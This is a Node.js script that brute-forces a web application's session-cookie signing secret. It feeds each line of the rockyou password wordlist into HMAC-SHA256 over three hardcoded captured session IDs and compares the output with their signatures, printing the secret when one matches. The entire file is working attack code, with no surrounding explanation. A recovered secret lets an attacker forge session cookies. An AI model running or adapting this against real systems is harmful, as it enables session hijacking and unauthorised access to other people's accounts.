const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');

const sids = [
  { sid: 'w2uDoXey7_wKb5QM-CSBgXBg9tIpeppQ', sig: 'hmqHIcbdGe863wsmNqdUFIiud2IH4LZBbHZgqcy7TRo' },
  { sid: 'kfZ_pAiL_9jLMe7QbMyoyKv8cFs7u7wJ', sig: 'eXg9Hgw7KYHaykHp+rnSKYEqzqr2G79bRHntwp2H+IY' },
  { sid: 'riySFLWHpI9sxSXyrbXgZEWHbLGE8gAb', sig: 'fXdAKDP4JhVQfW0aj9lmbxr8MKEe/NZXxTreM5OrQ8g' }
];

function sign(secret, sid) {
  return crypto.createHmac('sha256', secret).update(sid).digest('base64')
    .replace(/=+$/, '').replace(/\//g, '%2F').replace(/\+/g, '+');
}

let count = 0;
let startTime = Date.now();
let found = false;

const stream = fs.createReadStream('/tmp/rockyou.txt');
const rl = readline.createInterface({ input: stream, crlfDelay: Infinity });

rl.on('line', (line) => {
  if (found) return;
  const secret = line.trim();
  if (!secret) return;
  count++;
  if (count % 100000 === 0) {
    const elapsed = (Date.now() - startTime) / 1000;
    console.log(`progress: ${count} lines, ${elapsed.toFixed(1)}s, ${(count/elapsed).toFixed(0)}/s`);
  }
  for (const { sid, sig } of sids) {
    const computed = sign(secret, sid);
    if (computed === sig) {
      console.log(`FOUND! secret="${secret}" matches sid=${sid}`);
      found = true;
      process.exit(0);
    }
  }
});

rl.on('close', () => {
  const elapsed = (Date.now() - startTime) / 1000;
  console.log(`DONE: ${count} lines, ${elapsed.toFixed(1)}s`);
});